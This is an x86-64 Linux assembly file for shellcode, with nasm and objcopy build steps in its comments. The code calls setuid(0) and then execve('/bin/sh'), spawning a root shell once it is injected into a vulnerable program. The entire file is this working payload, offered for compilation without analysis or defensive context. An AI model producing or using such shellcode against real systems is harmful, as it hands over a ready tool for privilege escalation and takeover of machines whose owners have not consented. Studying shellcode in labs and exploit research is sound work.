; Compiling shellcode
; nasm -felf64 shellcode.asm
; $ objcopy -S -O binary -j .text shellcode.o my_shellcode

section .text

global  main

main:
    xor rdi, rdi

    push 0x69                   ; set rax to the syscall for setuid (69)
    pop rax
    syscall

    push rdi                    ; NULL out rdx and rsi (second & third argument)
    push rdi
    pop rsi
    pop rdx

    mov rdi, 0x68732f6e69622f6a ;move 'hs/nib/j' into rdi
    shr rdi, 0x8                ;null truncate the backwards value to '\0hs\nib'
    push rdi
    push rsp
    pop rdi                     ;rdi is now a pointer to '/bin/sh\0' 

    push 0x3b                   
    pop rax                     ;set rax to have function call for execve
    syscall                     ;execve('/bin/sh', null, null)